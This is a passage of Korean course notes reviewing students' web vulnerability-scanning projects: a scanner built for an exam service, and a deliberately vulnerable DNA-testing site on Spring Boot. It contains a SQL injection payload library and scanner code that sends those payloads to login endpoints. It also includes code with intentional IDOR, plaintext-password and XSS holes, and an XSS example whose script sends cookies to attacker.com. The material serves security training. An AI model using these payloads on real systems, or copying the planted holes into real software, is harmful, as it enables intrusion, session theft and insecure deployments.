### A06:2021 - Vulnerable and Outdated Components
- [ ] 의존성 라이브러리 정기 업데이트
- [ ] 취약점 스캔 도구 사용 (OWASP Dependency-Check)
- [ ] End-of-Life 소프트웨어 사용 금지

### A07:2021 - Identification and Authentication Failures
- [ ] 강력한 비밀번호 정책 시행
- [ ] 다중 인증(MFA) 도입
- [ ] 세션 타임아웃 설정

### A08:2021 - Software and Data Integrity Failures
- [ ] 코드 서명 검증
- [ ] CI/CD 파이프라인 보안 강화
- [ ] 무결성 검증 메커니즘 구현

### A09:2021 - Security Logging and Monitoring Failures
- [ ] 모든 인증 시도 로깅
- [ ] 실시간 모니터링 시스템 구축
- [ ] 이상 행위 탐지 규칙 설정

### A10:2021 - Server-Side Request Forgery (SSRF)
- [ ] 사용자 입력 URL 검증
- [ ] 내부 IP 접근 차단
- [ ] 허용된 도메인 화이트리스트 관리
```

---

## 3.5 Q&A 세션 및 강사 피드백

### 3.5.1 진단 스크립트 구현 방식 질문

**질문 (강사)**:
> "페이로드에 삽입된 코드는 진단 스크립트 상에 구현된 코드인가?"

**답변 (6조)**:
> "네, 맞습니다. 저희가 지금 예시로 보여드리는 영상에서는 SQL 인젝션이 되는 걸 보여드리기 위해서
> 하나를 예시로 들었던 거고요. 지금 진단된 스크립트 안에서는 지금 말씀드린 대로 여러가지 SQL 인젝션이 발생할 수 있는 상황들을
> 연결해서 페이로드가 여러가지로 나오게 하였습니다."

**SQL Injection 페이로드 라이브러리 구현 예시**:
```python
# sql_injection_payloads.py

class SQLInjectionPayloads:
    """
    다양한 SQL Injection 공격 페이로드 모음
    """

    # 인증 우회 페이로드
    AUTH_BYPASS = [
        "admin' OR '1'='1",
        "admin' OR '1'='1'--",
        "admin' OR '1'='1'#",
        "' OR '1'='1'--",
        "') OR ('1'='1",
        "admin' OR 1=1--",
    ]

    # UNION 기반 공격
    UNION_BASED = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' UNION SELECT username, password FROM users--",
    ]

    # Error-based Injection
    ERROR_BASED = [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
    ]

    # Time-based Blind Injection
    TIME_BASED = [
        "' AND IF(1=1, SLEEP(5), 0)--",
        "'; WAITFOR DELAY '00:00:05'--",
    ]

    @classmethod
    def get_all_payloads(cls):
        """모든 페이로드 반환"""
        return (cls.AUTH_BYPASS + cls.UNION_BASED +
                cls.ERROR_BASED + cls.TIME_BASED)
```

### 3.5.2 진단 스크립트 구조 및 확장성 질문

**질문 (강사)**:
> "취약점 진단 스크립트가 어떤 식으로 동작하는지 동작 시연이나 구조에 대한 설명이나 이런 부분이 다 빠져 있었거든요.
> 중간중간에 코드, 중간 코드만 이렇게 보여주면서 이런 식으로 점검했습니다라고 얘기를 하니까
> **전체적인 그림이 어땠는지, 이 코드가 확장성을 가지는지** 이런 것들을 제가 판단하기가 힘들었었어요."

이 피드백은 매우 중요한 지적입니다. 진단 도구의 **아키텍처**와 **확장성**을 명확히 제시하지 못한 부분이 아쉬웠습니다.

#### 이상적인 진단 스크립트 아키텍처

**모듈화된 구조 예시**:
```
exam_service_scanner/
├── main.py                 # 진단 시작점
├── config/
│   ├── targets.json       # 진단 대상 서버 정보
│   └── settings.json      # 스캐너 설정
├── scanners/
│   ├── __init__.py
│   ├── base_scanner.py    # 추상 클래스
│   ├── sql_injection_scanner.py
│   ├── xss_scanner.py
│   ├── csrf_scanner.py
│   └── auth_scanner.py
├── payloads/
│   ├── sql_injection.py
│   ├── xss.py
│   └── path_traversal.py
├── reporters/
│   ├── html_reporter.py
│   ├── json_reporter.py
│   └── pdf_reporter.py
└── utils/
    ├── http_client.py
    ├── selenium_driver.py
    └── logger.py
```

**BaseScanner 추상 클래스**:
```python
# scanners/base_scanner.py
from abc import ABC, abstractmethod
from typing import List, Dict

class BaseScanner(ABC):
    """
    모든 스캐너의 기본 클래스
    새로운 취약점 스캐너를 추가할 때 이 클래스를 상속
    """

    def __init__(self, target_url: str):
        self.target_url = target_url
        self.results = []

    @abstractmethod
    def scan(self) -> List[Dict]:
        """
        취약점 스캔 수행 (하위 클래스에서 구현 필수)
        """
        pass

    def generate_report(self) -> Dict:
        """
        스캔 결과 리포트 생성
        """
        return {
            "scanner_name": self.__class__.__name__,
            "target_url": self.target_url,
            "total_tests": len(self.results),
            "vulnerable": sum(1 for r in self.results if r.get("vulnerable")),
            "safe": sum(1 for r in self.results if not r.get("vulnerable")),
            "details": self.results
        }
```

**SQL Injection Scanner 구현**:
```python
# scanners/sql_injection_scanner.py
from .base_scanner import BaseScanner
from payloads.sql_injection import SQLInjectionPayloads
import requests
import time

class SQLInjectionScanner(BaseScanner):
    """
    SQL Injection 취약점 스캐너
    """

    def scan(self) -> List[Dict]:
        """
        SQL Injection 취약점 스캔
        """
        print(f"[*] SQL Injection 스캔 시작: {self.target_url}")

        # 테스트 대상 엔드포인트 목록
        endpoints = [
            "/api/auth/login",
            "/api/exams/search",
            "/api/users/profile"
        ]

        for endpoint in endpoints:
            full_url = f"{self.target_url}{endpoint}"

            for payload in SQLInjectionPayloads.get_all_payloads():
                result = self._test_payload(full_url, payload)
                self.results.append(result)

                # 속도 제한 (DoS 방지)
                time.sleep(0.5)

        return self.results

    def _test_payload(self, url: str, payload: str) -> Dict:
        """
        개별 페이로드 테스트
        """
        try:
            # POST 요청으로 페이로드 전송
            response = requests.post(
                url,
                json={"username": payload, "password": "test"},
                timeout=10
            )

            # 응답 분석
            is_vulnerable = self._analyze_response(response)

            return {
                "url": url,
                "payload": payload,
                "vulnerable": is_vulnerable,
                "status_code": response.status_code,
                "response_time": response.elapsed.total_seconds(),
                "evidence": response.text[:200] if is_vulnerable else None
            }

        except Exception as e:
            return {
                "url": url,
                "payload": payload,
                "error": str(e)
            }

    def _analyze_response(self, response) -> bool:
        """
        응답에서 취약점 징후 탐지
        """
        response_text = response.text.lower()

        # SQL 에러 메시지 패턴
        error_patterns = [
            "sql syntax",
            "mysql error",
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "mysqli_",
            "sqlstate"
        ]

        return any(pattern in response_text for pattern in error_patterns)
```

**Main 스크립트**:
```python
# main.py
from scanners.sql_injection_scanner import SQLInjectionScanner
from scanners.xss_scanner import XSSScanner
from scanners.csrf_scanner import CSRFScanner
from reporters.html_reporter import HTMLReporter
from reporters.pdf_reporter import PDFReporter
import json

def load_config():
    """설정 파일 로드"""
    with open("config/targets.json", "r") as f:
        return json.load(f)

def main():
    """메인 진단 프로세스"""
    config = load_config()
    target_url = config["target_url"]

    print(f"=== 취약점 진단 시작 ===")
    print(f"대상 URL: {target_url}\n")

    # 모든 스캐너 실행
    scanners = [
        SQLInjectionScanner(target_url),
        XSSScanner(target_url),
        CSRFScanner(target_url)
    ]

    all_results = []
    for scanner in scanners:
        results = scanner.scan()
        report = scanner.generate_report()
        all_results.append(report)

        print(f"\n[{scanner.__class__.__name__}]")
        print(f"  총 테스트: {report['total_tests']}건")
        print(f"  취약: {report['vulnerable']}건")
        print(f"  안전: {report['safe']}건")

    # 리포트 생성
    html_reporter = HTMLReporter(all_results)
    html_reporter.save("report.html")

    pdf_reporter = PDFReporter(all_results)
    pdf_reporter.save("report.pdf")

    print(f"\n=== 진단 완료 ===")
    print(f"리포트 저장: report.html, report.pdf")

if __name__ == "__main__":
    main()
```

**확장성 있는 설계의 장점**:
1. **새로운 스캐너 추가 용이**: `BaseScanner`를 상속받아 `scan()` 메서드만 구현하면 됨
2. **페이로드 관리 편리**: `payloads/` 디렉토리에 새로운 페이로드 추가 가능
3. **리포트 형식 다양화**: HTML, PDF, JSON 등 다양한 형식 지원
4. **재사용성**: 다른 프로젝트에서도 스캐너 모듈 재사용 가능

### 3.5.3 팀 역할 분담 및 프로젝트 진행 방식

**질문 (강사)**:
> "프로젝트를 진행할 때 팀원들의 역할은 어떻게 분배를 했는지
> 그리고 프로젝트를 마치면서 소감, 프로젝트를 진행하면서 느꼈던 점, 이런 거에 대해서 간략하게 좀 얘기 좀 해줄 수 있을까요?"

**답변 (6조)**:
> "네 알겠습니다. 먼저 저랑 희희님께서 구축 담당을 맡았습니다. 그래서 프론트엔드랑 백엔드 서버 먼저 구축시키고 그 다음에 취약점 진단 자동화로 들어가기 위해서
> 나머지 분들께서는 취약점 진단, 스크립트, 주통기 기반, 점검 항목들 중에서 저희 프로젝트의 기획만 보고 약간 쓸 수 있는 항목들을 먼저 선별해 놓는 그런 작업을 하셨습니다."

**역할 분담 상세**:

| 팀원 | 담당 역할 | 주요 업무 |
|------|---------|---------|
| 팀원 1, 2 | 서비스 구축 | - 프론트엔드 개발 (Next.js)<br>- 백엔드 API 개발 (Java)<br>- AWS 인프라 구축 |
| 팀원 3, 4, 5 | 진단 자동화 | - KISA 가이드 분석<br>- 적용 가능 항목 선별<br>- 진단 스크립트 작성 |

**프로젝트 진행 방식**:
```
Day 1-2: 서비스 구축 (이틀)
  - 프론트엔드/백엔드 동시 개발
  - AWS 인프라 구성
  - 병렬로 진단 항목 선별

Day 3-4: 취약점 진단 자동화 (이틀)
  - 전체 팀원 참여
  - 모듈별 분담 개발
  - 교차 검증 수행

Day 5: 통합 및 테스트
  - 최종 통합
  - 발표 자료 준비
```

**중요한 전환점**:
> "사실 저희 팀원들 모두가 처음 그 취약점 자동화 진단 도구를 처음 만들어보는 탓에 약간 처음에 좀 고비를 많이 겪었는데
> **강사님께서 그때 모듈을 사용해서 제작하면 된다** 라고 말씀해 주셔서
> 각자 그러면은 파트를 나눠서 각자 모듈을 개발해 보자 말했고, 그래서 **메인 틀은 다 같이 가져가되 모듈은 각자 추가해 나가는 방식**으로
> 대신에 모듈은 각자 모두가 **수동 점검을 해서 이게 교차 검증**을 한 번씩 할 수 있도록 진행하였습니다."

**교차 검증 프로세스**:
```
개발자 A가 SQL Injection 모듈 개발
   ↓
개발자 B가 수동으로 SQL Injection 테스트
   ↓
결과 비교 및 검증
   ↓
차이점 발견 시 모듈 수정
   ↓
재검증
```

이 방식의 장점:
- **품질 보증**: 자동화 도구의 정확성 검증
- **학습 효과**: 수동 테스트로 취약점 원리 깊이 이해
- **버그 발견**: 자동화 도구의 오류 조기 발견

### 3.5.4 프로젝트 소감 및 교훈

**6조의 프로젝트 소감**:
> "프로젝트 소감, 프로젝트 소감은 아무래도 다들 다른 조들도 다들 똑같이 공감하셨던 것 같은데 **시간을 쫓기면서 만들었던 게** 저희도 가장 힘들었던 것 같습니다.
> 처음에 프로젝트 진행할 때는 그 처음에 구축 이틀 그리고 취약점 진단 이틀로 그렇게 잡았던 것 같은데
> 이 때문에 **구축에서 많은 시간을 보낼 수 없어서** 얼른 마무리하고 취약점 진단으로 넘어왔는데
> 제가 개발하고 넘어왔다 보니까 주통기 기반 정보 항목들을 살펴보면서
> 아 **이건 이런 식으로 또 구축해서 취약점 시나리오를 이렇게 확장해 나가면 또 좋았을 것 같다**라는 생각이 들긴 했었습니다."

**핵심 교훈**:
1. **시간 관리의 중요성**: 타이트한 일정에서 우선순위 설정 필요
2. **사전 기획의 중요성**: 구축 단계에서 진단 시나리오를 미리 고려했다면 더 효율적
3. **반복적 개선**: 완벽을 추구하기보다는 MVP(Minimum Viable Product)를 먼저 완성 후 개선

**실무 적용 시 고려사항**:
- **개발과 보안의 균형**: 기능 구현과 보안 강화를 동시에 진행하기 어려움
- **진단 자동화의 한계**: 모든 취약점을 자동으로 탐지하기는 불가능
- **지속적인 업데이트**: 새로운 취약점 발견 시 진단 도구도 업데이트 필요

---

## 3.6 강사 종합 피드백 및 개선 제안

### 3.6.1 강점

1. **명확한 프로젝트 목표**: 국가 자격 시험 서비스라는 구체적 도메인 선정
2. **실제 환경 구축**: AWS 3-Tier 아키텍처로 실무 환경 모사
3. **자동화 도구 개발**: 반복 점검의 효율성 향상
4. **팀워크**: 역할 분담과 교차 검증 프로세스 구축

### 3.6.2 개선 필요 사항

**1. 범용성 및 확장성 부족 (Selenium 관련)**

**문제점**:
- Selenium은 특정 사이트 구조에 강하게 결합됨
- HTML 구조 변경 시 전면 재작성 필요
- 다른 프로젝트에 재사용 어려움

**개선 방안**:
```python
# 개선 전: 하드코딩된 셀렉터
username_field = driver.find_element(By.ID, "username_input_2024_v3")

# 개선 후: 유연한 셀렉터 전략
class FlexibleSelector:
    """
    여러 셀렉터 전략을 순차적으로 시도
    """

    @staticmethod
    def find_element_flexible(driver, selectors):
        """
        여러 셀렉터를 순서대로 시도하여 요소 찾기
        """
        for selector_type, selector_value in selectors:
            try:
                element = driver.find_element(selector_type, selector_value)
                if element.is_displayed():
                    return element
            except:
                continue

        raise Exception("요소를 찾을 수 없습니다")

# 사용 예
username_selectors = [
    (By.ID, "username"),
    (By.NAME, "username"),
    (By.CSS_SELECTOR, "input[type='text'][placeholder*='아이디']"),
    (By.XPATH, "//input[contains(@placeholder, '사용자')]")
]

username_field = FlexibleSelector.find_element_flexible(driver, username_selectors)
```

**API 기반 테스트로 전환**:
```python
# Selenium 대신 직접 API 호출
import requests

def test_sql_injection_api():
    """
    API 엔드포인트에 직접 SQL Injection 테스트
    (Selenium보다 빠르고 안정적)
    """
    payloads = ["admin' OR '1'='1", "' UNION SELECT * FROM users--"]

    for payload in payloads:
        response = requests.post(
            "http://exam-service.com/api/auth/login",
            json={"username": payload, "password": "test"},
            timeout=10
        )

        # 응답 분석
        if response.status_code == 500 or "SQL" in response.text:
            print(f"[취약] Payload: {payload}")
```

**2. 발표 자료 구성**

**문제점**:
- 진단 도구의 전체 구조 설명 부족
- 시연 영상 위주로 진행되어 코드 이해 어려움
- 확장성에 대한 설명 미흡

**개선 방안**:
- **아키텍처 다이어그램 추가**: Mermaid로 시스템 구조 시각화
- **코드 흐름 설명**: 진단 프로세스를 단계별로 설명
- **모듈화 전략 강조**: 새로운 취약점 추가 시 작업 방법 제시

---

## 3.7 6조 프로젝트 최종 평가

### 3.7.1 기술적 성과

| 평가 항목 | 점수 (10점 만점) | 평가 |
|---------|----------------|------|
| 시스템 아키텍처 | 8/10 | AWS 3-Tier 구조 우수 |
| 취약점 발견 능력 | 7/10 | SQL Injection 등 주요 취약점 탐지 |
| 자동화 도구 품질 | 6/10 | 기능은 작동하나 범용성 부족 |
| 코드 품질 | 7/10 | 구조화 필요, 확장성 개선 여지 있음 |
| 문서화 | 6/10 | 발표 자료는 있으나 기술 문서 미흡 |

### 3.7.2 학습 성과

6조가 프로젝트를 통해 얻은 핵심 학습 내용:

1. **3-Tier 아키텍처 실무 경험**: 웹-WAS-DB 분리의 중요성 체득
2. **보안 취약점 원리 이해**: SQL Injection, CSRF 등의 동작 원리 학습
3. **자동화 도구 개발 경험**: Selenium 활용 및 한계 인식
4. **팀 협업 프로세스**: 역할 분담, 교차 검증, 모듈화 전략 습득
5. **시간 관리 교훈**: 타이트한 일정에서 우선순위 설정 능력 향상

### 3.7.3 향후 발전 방향

**단기 개선 (1주일 내)**:
- Selenium 의존도 줄이고 API 기반 테스트 추가
- 진단 모듈 추상화 (BaseScanner 패턴 적용)
- 페이로드 라이브러리화

**중기 개선 (1개월 내)**:
- 다양한 취약점 스캐너 추가 (XSS, Path Traversal, IDOR 등)
- 리포트 자동 생성 기능 강화 (PDF, HTML, JSON)
- CI/CD 파이프라인 통합

**장기 목표 (최종 프로젝트)**:
- 다른 웹 서비스에도 적용 가능한 범용 스캐너 개발
- AI 기반 취약점 탐지 기능 추가
- 실시간 모니터링 대시보드 구축

---

**6조 프로젝트 총평**:

6조는 국가 자격 시험 서비스라는 명확한 도메인을 선정하고, AWS 기반 3-Tier 아키텍처를 구축하여 실무 환경을 잘 모사했습니다. Selenium을 활용한 동적 진단 도구를 개발하여 SQL Injection 등 주요 취약점을 자동으로 탐지할 수 있었으나, 범용성과 확장성 측면에서 개선이 필요합니다. 팀원 간 역할 분담과 교차 검증 프로세스는 우수했으며, 시간 관리의 중요성을 깨달은 것이 큰 수확입니다. 강사의 피드백을 바탕으로 API 기반 테스트 전환, 모듈화 강화 등의 개선을 진행한다면 최종 프로젝트에서 더욱 발전된 결과를 기대할 수 있습니다.

---

**(Section 3 계속 - Part 2: 3조 "헬릭스" DNA Lab 프로젝트로 이어짐)**
# Section 3: 6조 + 3조 프로젝트 상세 분석 (계속)

## Part 2: 3조 "헬릭스" - DNA Lab 유전자 검사 서비스 보안 진단

---

## 3.8 3조 프로젝트 개요

### 3.8.1 팀명 및 프로젝트 배경

**팀명**: 헬릭스 (Helix)
- **의미**: DNA 이중 나선 구조를 뜻하는 영어 단어
- **선정 이유**: 유전자 검사 서비스를 주제로 한 프로젝트의 정체성을 명확히 표현

**프로젝트명**: DNA Lab - 차세대 유전자 서열 분석 서비스 및 보안 취약점 진단 시스템

> "조 이름에 걸맞게 DNA Lab 이라는 웹페이지를 만들고 취약점을 자동으로 진단하는 서비스를 만들었습니다."

### 3.8.2 프로젝트 선정 배경

#### 1. 개인 유전 정보의 민감성 증가

발표 내용:

> "개인 유전 정보의 민감성이 상당히 증가하고 있죠. 인간 지도도 완성되고 유전자 검사 서비스가 대중화되면서 유전 정보 유출 위험도 커지고 있습니다."

**유전자 검사 시장 현황**:
- **시장 규모 확대**: 2020년대 들어 개인 유전자 검사 서비스 급성장
- **대중화**: 23andMe, Ancestry DNA 등 수백만 명 이용
- **다양한 용도**: 조상 분석, 질병 위험도 예측, 약물 반응성 검사 등

**유전 정보의 특수성**:
```markdown
## 유전 정보 vs 일반 개인정보

### 일반 개인정보 (예: 비밀번호, 신용카드 번호)
- 유출 시 변경 가능
- 개인에게만 영향
- 시간이 지나면 가치 감소 가능

### 유전 정보
- **평생 불변**: 한 번 유출되면 영구적 피해
- **가족 연관**: 부모, 형제, 자녀에게도 영향
- **미래 영향**: 아직 태어나지 않은 자손에게도 영향
- **차별 가능성**: 보험, 고용 등에서 불리하게 사용될 위험
- **범죄 악용**: 표적 공격, 맞춤형 생물학적 무기 등
```

#### 2. 실제 데이터 유출 사례 연구: 23andMe

**2023년 23andMe 데이터 유출 사건**:

> "2023년에 발생한 23andMe라는 데이터 유출 사건인데요. 무려 **690만 명의 유전자 데이터가 유출**됐습니다.
> 이름과 생년월일은 물론이고 **유전자 염기 서열 같은 민감한 정보** 또한 같이 유출됐습니다."

**사건 상세**:

| 항목 | 내용 |
|------|------|
| 발생 시기 | 2023년 10월 |
| 피해 규모 | 690만 명 (전체 사용자의 약 50%) |
| 유출 정보 | - 이름, 생년월일, 이메일<br>- DNA 염기 서열<br>- 조상 정보 (Ancestry)<br>- DNA 연관 친척 정보 |
| 공격 방법 | Credential Stuffing (다른 사이트에서 유출된 계정 정보 재사용) |
| 합의금 | 약 400억 원 (3000만 달러) |

**DNA 연관 기능의 악용**:

> "특히 이 사건에서는 **DNA 연관 유전 정보 기능이 악용**됐습니다. 즉 DNA는 부모 형제 등 가족과 어느 정도 비슷하니까
> 탈취된 유전 정보는 **보험 차별이나 표적 마케팅 등 다양한 방식으로 악용**됐으며 **다크웹에서도 팔렸다**고 합니다."

**DNA Relatives 기능의 위험성**:
```
한 사용자의 계정 탈취
   ↓
해당 사용자의 DNA 정보 획득
   ↓
DNA Relatives 기능으로 연결된 친척들의 정보도 접근 가능
   ↓
1명의 계정 탈취 → 수십~수백 명의 유전 정보 노출
```

**유전 정보의 영구성**:

> "비밀번호는 한번 털리면 바꿀 수도 있지만 **DNA는 평생 바꿀 수가 없습니다**.
> 그래서 유전자 정보 보안이 얼마나 중요한지 분명하게 보여주는 사례라고 볼 수 있습니다."

#### 3. 복잡한 보안 위협 환경

발표 내용:

> "보안 위험이 복잡해지고 사이버 공격 기술이 고도화되면서 점점 다양한 위험에 노출되기 시작했습니다.
> 실제로 데이터 유출 사고도 있었습니다. 그래서 이로 인해 사용자 신뢰가 떨어지고 막대한 피해가 발생하고 있습니다."

**현대 보안 위협의 특징**:
1. **고도화**: APT (Advanced Persistent Threat) 공격 증가
2. **자동화**: 봇넷을 이용한 대규모 자동 공격
3. **타겟화**: 특정 기업/개인을 겨냥한 맞춤형 공격
4. **복합적**: 여러 취약점을 연쇄적으로 악용

#### 4. 자동화된 진단 시스템의 필요성

> "마지막으로 자동화된 진단 시스템이 꼭 필요하다 생각해서 수동으로는 한계가 있고
> 효율적이고 신속한 자동화 시스템이 요즘 시대에 필수적이라고 생각했습니다."

**수동 진단의 한계**:
- **시간 소모**: 전체 시스템 점검에 수일 소요
- **일관성 부족**: 점검자에 따라 결과 편차 발생
- **피로도**: 반복 작업으로 인한 실수 증가
- **즉각 대응 불가**: 새로운 취약점 발견 시 신속한 재점검 어려움

---

## 3.9 Rookies DNA 서비스 구축

### 3.9.1 서비스 개요

**브랜드 아이덴티티**:

> "23andMe라는 회사를 생각하면서 **Rookies DNA**라는 웹사이트를 만들었습니다.
> Rookies DNA는 '**나의 유전자 더 깊이 이해하다**' 라는 슬로건으로
> 차세대 염기 서열 분석 서비스를 제공하는 유전자 검사 플랫폼이라고 가정을 했습니다."

**서비스 특징**:
- **실제 운영 서비스처럼 구현**: 완성도 높은 UI/UX
- **의도적 취약점 내장**: 보안 진단 테스트 환경
- **신뢰성 요소 포함**: ISO 27001 인증, 99.9% 정확도 표시 등

### 3.9.2 기술 스택

#### 백엔드
- **Java Spring Boot**: 엔터프라이즈급 웹 애플리케이션 프레임워크
  - MVC 패턴
  - 의존성 주입 (Dependency Injection)
  - AOP (Aspect-Oriented Programming)

**Spring Boot 프로젝트 구조 예시**:
```
rookies-dna/
├── src/
│   ├── main/
│   │   ├── java/
│   │   │   └── com/
│   │   │       └── rookies/
│   │   │           └── dna/
│   │   │               ├── RookiesDnaApplication.java  # 메인 클래스
│   │   │               ├── controller/
│   │   │               │   ├── UserController.java
│   │   │               │   ├── ExamController.java     # DNA 검사 신청
│   │   │               │   └── ResultController.java   # 검사 결과 조회
│   │   │               ├── service/
│   │   │               │   ├── UserService.java
│   │   │               │   └── DnaAnalysisService.java
│   │   │               ├── repository/
│   │   │               │   ├── UserRepository.java
│   │   │               │   └── DnaResultRepository.java
│   │   │               ├── entity/
│   │   │               │   ├── User.java
│   │   │               │   └── DnaResult.java
│   │   │               └── dto/
│   │   │                   ├── UserRegistrationDTO.java
│   │   │                   └── DnaResultDTO.java
│   │   └── resources/
│   │       ├── application.yml
│   │       ├── static/
│   │       └── templates/
│   └── test/
│       └── java/
```

**Spring Boot Controller 예시**:
```java
@RestController
@RequestMapping("/api/dna")
public class DnaAnalysisController {

    @Autowired
    private DnaAnalysisService dnaAnalysisService;

    /**
     * DNA 검사 신청
     */
    @PostMapping("/exams/apply")
    public ResponseEntity<?> applyExam(@RequestBody DnaExamRequest request) {
        // 취약점: 입력 검증 부족
        DnaExamResult result = dnaAnalysisService.createExam(request);
        return ResponseEntity.ok(result);
    }

    /**
     * DNA 검사 결과 조회
     */
    @GetMapping("/results/{userId}")
    public ResponseEntity<?> getResults(@PathVariable("userId") Long userId) {
        // 취약점: 권한 검증 없음 (IDOR)
        DnaResult result = dnaAnalysisService.getResultByUserId(userId);
        return ResponseEntity.ok(result);
    }

    /**
     * DNA 매칭 서비스
     */
    @GetMapping("/matching")
    public ResponseEntity<?> findRelatives(@RequestParam("userId") Long userId) {
        List<DnaMatch> matches = dnaAnalysisService.findDnaMatches(userId);
        return ResponseEntity.ok(matches);
    }
}
```

#### 데이터베이스
- **MariaDB**: MySQL 호환 오픈소스 RDBMS
  - 높은 성능
  - 트랜잭션 지원
  - 복제 및 클러스터링 기능

**데이터베이스 스키마 예시**:
```sql
-- 사용자 테이블
CREATE TABLE users (
    user_id BIGINT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    full_name VARCHAR(100),
    birth_date DATE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- DNA 검사 신청 테이블
CREATE TABLE dna_exams (
    exam_id BIGINT AUTO_INCREMENT PRIMARY KEY,
    user_id BIGINT NOT NULL,
    exam_type ENUM('ancestry', 'disease', 'drug_response') NOT NULL,
    status ENUM('pending', 'processing', 'completed') DEFAULT 'pending',
    applied_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE,
    INDEX idx_user_status (user_id, status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- DNA 검사 결과 테이블
CREATE TABLE dna_results (
    result_id BIGINT AUTO_INCREMENT PRIMARY KEY,
    exam_id BIGINT NOT NULL,
    genetic_data TEXT,  -- 취약점: 평문 저장
    ancestry_info JSON,
    disease_risk JSON,
    completed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (exam_id) REFERENCES dna_exams(exam_id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- DNA 매칭 테이블 (DNA Relatives 기능)
CREATE TABLE dna_matches (
    match_id BIGINT AUTO_INCREMENT PRIMARY KEY,
    user_id BIGINT NOT NULL,
    matched_user_id BIGINT NOT NULL,
    match_percentage DECIMAL(5,2),  -- 유전자 일치율 (예: 50.00%)
    relationship VARCHAR(50),  -- 관계 (예: '2nd cousin')
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE,
    FOREIGN KEY (matched_user_id) REFERENCES users(user_id) ON DELETE CASCADE,
    INDEX idx_user_match (user_id, match_percentage DESC)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

#### 인프라
- **AWS EC2**: 가상 서버 인스턴스
- **Docker**: 컨테이너화를 통한 일관된 배포 환경

**Dockerfile 예시**:
```dockerfile
# 빌드 스테이지
FROM maven:3.8-openjdk-17 AS build
WORKDIR /app
COPY pom.xml .
COPY src ./src
RUN mvn clean package -DskipTests

# 실행 스테이지
FROM openjdk:17-jdk-slim
WORKDIR /app
COPY --from=build /app/target/rookies-dna-0.0.1-SNAPSHOT.jar app.jar

# 환경 변수 설정
ENV SPRING_PROFILES_ACTIVE=production
ENV DB_HOST=mariadb
ENV DB_PORT=3306
ENV DB_NAME=rookies_dna

EXPOSE 8080

# 취약점: root 사용자로 실행
# 개선: RUN useradd -m appuser && USER appuser
ENTRYPOINT ["java", "-jar", "app.jar"]
```

**docker-compose.yml**:
```yaml
version: '3.8'

services:
  # MariaDB 서비스
  mariadb:
    image: mariadb:10.11
    container_name: rookies_dna_db
    environment:
      MYSQL_ROOT_PASSWORD: rootpassword123  # 취약점: 평문 비밀번호
      MYSQL_DATABASE: rookies_dna
      MYSQL_USER: dna_user
      MYSQL_PASSWORD: dnapassword
    ports:
      - "3306:3306"  # 취약점: 외부 포트 노출
    volumes:
      - mariadb_data:/var/lib/mysql
    networks:
      - dna_network

  # Spring Boot 애플리케이션
  app:
    build: .
    container_name: rookies_dna_app
    depends_on:
      - mariadb
    ports:
      - "8080:8080"
    environment:
      DB_HOST: mariadb
      DB_PORT: 3306
      DB_NAME: rookies_dna
      DB_USER: dna_user
      DB_PASSWORD: dnapassword
    networks:
      - dna_network

volumes:
  mariadb_data:

networks:
  dna_network:
    driver: bridge
```

### 3.9.3 주요 기능

#### 1. 회원가입 및 로그인

**회원가입 플로우**:
```
사용자 정보 입력
   ↓
개인정보 수집 및 이용 동의
   ↓
계정 생성
   ↓
이메일 인증 (선택적)
   ↓
로그인
```

**취약점 내장**:
```java
// 취약한 회원가입 처리
@PostMapping("/api/users/register")
public ResponseEntity<?> register(@RequestBody UserRegistrationDTO dto) {
    // 취약점 1: 입력 검증 부족
    // 취약점 2: 비밀번호 평문 저장 (의도적)
    User user = new User();
    user.setUsername(dto.getUsername());
    user.setPassword(dto.getPassword());  // 평문 저장!
    user.setEmail(dto.getEmail());

    userRepository.save(user);

    return ResponseEntity.ok("회원가입 성공");
}
```

#### 2. DNA 검사 신청

발표 내용:

> "검사 신청을 하면 여기서 수동으로 XSS 공격을 한번 테스트 해 보는 것을 볼 수 있는데요.
> 여러분도 아시다시피 이렇게 입력을 했을 때 신청을 누르면 글이 써지는데 여기서 **악성 코드가 발생**할 수 있죠."

**XSS (Cross-Site Scripting) 취약점**:
```java
// 취약한 검사 신청 처리
@PostMapping("/api/dna/exams")
public ResponseEntity<?> createExam(@RequestBody DnaExamDTO dto) {
    DnaExam exam = new DnaExam();
    exam.setUserId(dto.getUserId());
    exam.setExamType(dto.getExamType());
    exam.setMemo(dto.getMemo());  // 취약점: XSS 필터링 없음

    examRepository.save(exam);

    return ResponseEntity.ok(exam);
}
```

**XSS 공격 시나리오**:
```html
<!-- 사용자가 메모 필드에 입력하는 악성 스크립트 -->
<script>
    // 쿠키 탈취
    var cookies = document.cookie;
    fetch('http://attacker.com/steal?data=' + encodeURIComponent(cookies));
</script>

<!-- 또는 -->

```

**결과**:
```
DNA 검사 신청 메모 조회 페이지에서 스크립트 실행
   ↓
다른 사용자가 해당 페이지 열람 시 스크립트 자동 실행
   ↓
세션 쿠키 탈취 → 계정 탈취 가능
```

#### 3. DNA 검사 결과 조회

**IDOR (Insecure Direct Object Reference) 취약점**:

발표 내용:

> "그리고 여기서 뷰 아이디를 위해서 바꾸는 모습을 볼 수 있는데
> 원래는 본인이나 의사만 보여야 되는데 이렇게 **읽기가 가능한** 모습도 볼 수 있습니다."

**취약한 코드**:
```java
// 취약점: 권한 검증 없이 userId만으로 결과 조회
@GetMapping("/api/dna/results/{userId}")
public ResponseEntity<?> getResults(@PathVariable Long userId) {
